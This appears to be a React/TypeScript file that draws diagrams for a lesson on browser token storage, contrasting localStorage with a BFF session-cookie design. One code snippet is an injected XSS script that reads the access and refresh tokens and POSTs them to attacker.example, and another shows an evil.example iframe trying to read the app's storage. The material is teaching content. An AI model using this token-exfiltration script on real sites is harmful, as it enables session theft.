import { BoxGraph, type Box, type Field, type GraphSpec, type GraphStep, type OutLine, type Region } from '../BoxGraph'
import type { QuestionDrawing, StageDrawingProps } from '../drawing'

const SETUP_CODE = [
  '// after sign-in',
  'localStorage.setItem("access_token", tokens.access_token);',
  'localStorage.setItem("refresh_token", tokens.refresh_token);',
]
const XSS_CODE = [
  '// injected script, running on the app\'s origin',
  'const stolen = {',
  '  access: localStorage.getItem("access_token"),',
  '  refresh: localStorage.getItem("refresh_token"),',
  '};',
  'fetch("https://attacker.example/c", { method: "POST", body: JSON.stringify(stolen) });',
]
const X = { ALL: [0, 5] as [number, number], READ: [1, 4] as [number, number], SEND: 5 }
const BFF_CODE = [
  '// the BFF\'s response after sign-in',
  'Set-Cookie: __Host-session=…; Path=/; Secure; HttpOnly; SameSite=Strict',
  '',
  '// the app calls its own BFF; the browser adds the cookie',
  'fetch("/bff/api/orders", { headers: { "X-CSRF": "1" } });',
  '',
  '// injected script',
  'localStorage.getItem("access_token");  // null',
  'document.cookie;                       // no HttpOnly cookie in it',
]
const B = { COOKIE: 1, CALL: 4, XSS: [7, 8] as [number, number], CSRF: 4 }
const IFRAME_CODE = [
  '<!-- on evil.example -->',
  '<iframe src="https://app.example"></iframe>',
  '<script>',
  '  frames[0].localStorage.getItem("refresh_token");',
  '</script>',
]
const I = { EMBED: 1, READ: 3 }
const SEND_CODE = [
  '<img src="https://img.cdn.example/logo.png">',
  '<script src="https://widgets.example/chat.js"></script>',
]
const S = { IMG: 0, SCRIPT: 1 }
const API_CALL = [
  ...SEND_CODE,
  '',
  '// only the app\'s own API calls carry the token, because its code adds it',
  'fetch("https://api.example/orders", {',
  '  headers: { Authorization: `Bearer ${localStorage.getItem("access_token")}` },',
  '});',
]
const STORAGE_CODE = [
  'localStorage.setItem("access_token", …);   // kept until removed',
  'sessionStorage.setItem("draft", …);        // cleared when the tab closes',
]

const BROWSER: Region = { id: 'browser', name: 'Browser', sub: 'the app\'s page', tone: 'ui' }
const SERVERS: Region = { id: 'servers', name: 'Servers', tone: 'io' }
const spec = (code: string[], steps: Record<string, GraphStep>, regions: Region[] = [BROWSER, SERVERS], outputName?: string): GraphSpec => ({ regions, code, outputName, steps })

const spa: Box = { id: 'spa', region: 'browser', title: 'SPA', sub: 'the app\'s own code', fields: [{ name: 'origin', value: 'app.example' }] }
const tokens = (kind?: Field['kind'], value = 'stored', sub?: string, boxKind?: Box['kind']): Box => ({
  id: 'ls',
  region: 'browser',
  title: 'localStorage',
  sub,
  kind: boxKind,
  fields: [
    { name: 'access_token', value, kind },
    { name: 'refresh_token', value, kind },
  ],
})
const api: Box = { id: 'api', region: 'servers', title: 'API', sub: 'api.example' }
const still = (b: Box): Box => ({ ...b, still: true })

// ---- Reality: XSS steals the tokens ----
const script = (fields: Field[]): Box => ({ id: 'xss', region: 'browser', title: 'injected script', sub: 'runs on the app\'s origin', kind: 'bad', fields })
const attacker = (fields: Field[] = []): Box => ({ id: 'attacker', region: 'servers', title: 'attacker.example', sub: 'the attacker\'s server', kind: 'bad', fields })
const READS: Field = { name: 'reads', value: 'localStorage', ref: 'ls', kind: 'bad' }
const SENDS: Field = { name: 'sends to', value: 'attacker', ref: 'attacker', kind: 'bad' }

// ---- Reality: BFF ----
const cookie: Box = { id: 'cookie', region: 'browser', title: 'session cookie', sub: 'HttpOnly, Secure, SameSite', fields: [{ name: 'holds', value: 'session id only' }] }
const emptyLs: Box = { id: 'ls', region: 'browser', title: 'localStorage', fields: [{ name: 'tokens', value: 'none', kind: 'ok' }] }
const bff = (extra: Field[] = []): Box => ({
  id: 'bff',
  region: 'servers',
  title: 'BFF',
  sub: 'server side of the app',
  fields: [{ name: 'access_token', value: 'kept here' }, { name: 'refresh_token', value: 'kept here' }, ...extra],
})
const FORWARDS: Field = { name: 'forwards with token', value: 'API', ref: 'api' }
const spaCalls = (kind?: Field['kind']): Box => ({ ...spa, fields: [...spa.fields!, { name: 'calls', value: 'BFF + cookie', ref: 'bff', kind }] })

// ---- Claims ----
const EVIL_REGION: Region = { id: 'browser', name: 'Browser', sub: 'the user visits evil.example', tone: 'ui' }
const evil = (fields: Field[] = []): Box => ({ id: 'evil', region: 'browser', title: 'evil.example page', sub: 'its own script', fields })
const frame: Box = { id: 'frame', region: 'browser', title: 'iframe', sub: 'app.example inside', fields: [{ name: 'origin', value: 'app.example' }] }
const NET: Region = { id: 'servers', name: 'Requests', sub: 'sent by the browser', tone: 'io' }
const request = (id: string, title: string, auth: string, kind?: Field['kind']): Box => ({ id, region: 'servers', title, fields: [{ name: 'Authorization', value: auth, kind }] })
const SESSION: Region = { id: 'servers', name: 'Session', tone: 'io' }
const tab = (state: string, kind?: Field['kind']): Box => ({ id: 'tab', region: 'browser', title: 'app tab', fields: [{ name: 'tab', value: state, kind }] })
const signIn = (value: string, kind?: Field['kind']): Box => ({ id: 'signin', region: 'servers', title: 'user', fields: [{ name: 'next visit', value, kind }] })
const thief: OutLine[] = [{ label: 'Stolen tokens', text: 'stay usable until they expire', kind: 'bad' }]

const SPECS: Record<string, GraphSpec> = {
  setup: spec(SETUP_CODE, {
    storage: { boxes: [spa, tokens(), api], line: [1, 2] },
    review: { boxes: [still(spa), still(tokens()), still(api), { id: 'bff', region: 'servers', title: 'BFF', sub: 'recommended', kind: 'muted', fields: [{ name: 'addresses', value: '?', kind: 'muted' }] }], line: null },
  }),
  xss: spec(XSS_CODE, {
    inject: { boxes: [still(spa), still(tokens()), script([]), still(api)], line: 0 },
    read: { boxes: [still(spa), tokens('bad', 'read'), script([READS]), still(api)], line: X.READ, bad: true },
    send: { boxes: [still(spa), tokens('bad', 'read'), script([READS, SENDS]), attacker([{ name: 'has', value: 'both tokens', kind: 'bad' }]), still(api)], line: X.SEND, bad: true },
    replay: {
      boxes: [still(spa), tokens('bad', 'read'), script([READS, SENDS]), attacker([{ name: 'has', value: 'both tokens' }, { name: 'calls', value: 'API, from anywhere', ref: 'api', kind: 'bad' }]), api],
      line: null,
    },
  }),
  bff: spec(BFF_CODE, {
    login: { boxes: [spa, cookie, emptyLs, bff(), api], line: B.COOKIE },
    call: { boxes: [still(spaCalls()), still(cookie), still(emptyLs), bff([FORWARDS]), still(api)], line: B.CALL },
    inject: {
      boxes: [still(spaCalls()), still(cookie), still(emptyLs), script([{ name: 'finds tokens', value: 'none', kind: 'ok' }]), still(bff([FORWARDS])), still(api)],
      line: B.XSS,
    },
    csrf: {
      boxes: [
        still(spaCalls()),
        still(cookie),
        still(emptyLs),
        still(script([{ name: 'finds tokens', value: 'none', kind: 'ok' }])),
        bff([FORWARDS, { name: 'requires', value: 'anti-CSRF header', kind: 'ok' }]),
        still(api),
      ],
      line: B.CSRF,
    },
  }),

  'iframe-claim': spec(
    IFRAME_CODE,
    {
      embed: { boxes: [evil(), frame, tokens(undefined, 'stored', 'of app.example')], line: I.EMBED },
      read: { boxes: [evil([{ name: 'reads', value: 'app storage', ref: 'ls', kind: 'bad' }]), frame, tokens('bad', 'copied', 'of app.example')], line: I.READ, bad: true },
    },
    [EVIL_REGION],
  ),
  'iframe-reality': spec(
    IFRAME_CODE,
    {
      embed: { boxes: [evil(), frame, tokens(undefined, 'stored', 'of app.example')], line: I.EMBED },
      read: {
        boxes: [evil([{ name: 'reads', value: 'SecurityError', kind: 'ok' }, { name: 'own storage', value: 'evil.example only' }]), frame, tokens('ok', 'untouched', 'of app.example')],
        line: I.READ,
      },
    },
    [EVIL_REGION],
  ),

  'auto-send-claim': spec(
    SEND_CODE,
    {
      image: { boxes: [still(spa), tokens(), request('img', 'GET img.cdn.example', 'Bearer … (claimed)', 'bad')], line: S.IMG, bad: true },
      script: { boxes: [still(spa), tokens(), request('img', 'GET img.cdn.example', 'Bearer … (claimed)', 'bad'), request('js', 'GET widgets.example', 'Bearer … (claimed)', 'bad')], line: S.SCRIPT, bad: true },
    },
    [BROWSER, NET],
  ),
  'auto-send-reality': spec(
    API_CALL,
    {
      image: { boxes: [still(spa), tokens(), request('img', 'GET img.cdn.example', 'none', 'ok')], line: S.IMG },
      script: {
        boxes: [still(spa), tokens(), request('img', 'GET img.cdn.example', 'none', 'ok'), { ...request('js', 'GET widgets.example', 'none', 'ok'), fields: [{ name: 'Authorization', value: 'none', kind: 'ok' }, { name: 'once loaded', value: 'runs as page code (XSS case)' }] }, request('api', 'GET api.example', 'added by app code')],
        line: [3, 6],
      },
    },
    [BROWSER, NET],
  ),

  'tab-close-claim': spec(
    SETUP_CODE,
    {
      close: { boxes: [tab('closed'), tokens('bad', 'cleared (claimed)')], line: null },
      reopen: { boxes: [tab('opened again'), tokens('bad', 'cleared (claimed)'), signIn('signs in again', 'bad'), { id: 'bff', region: 'servers', title: 'BFF', sub: 'claimed purpose', kind: 'bad', fields: [{ name: 'job', value: 'keep sessions alive' }] }], line: null },
    },
    [BROWSER, SESSION],
  ),
  'tab-close-reality': spec(
    STORAGE_CODE,
    {
      close: { boxes: [tab('closed'), tokens('ok', 'still stored')], line: { each: [0, 1] } },
      reopen: { boxes: [tab('opened again'), tokens('bad', 'still stored'), signIn('tokens still there')], line: 0, output: thief },
    },
    [BROWSER, SESSION],
    'Risk',
  ),
}

const drawing: QuestionDrawing = Object.fromEntries(
  Object.entries(SPECS).map(([stage, s]) => [stage, (p: StageDrawingProps) => <BoxGraph spec={s} {...p} />]),
)
export default drawing
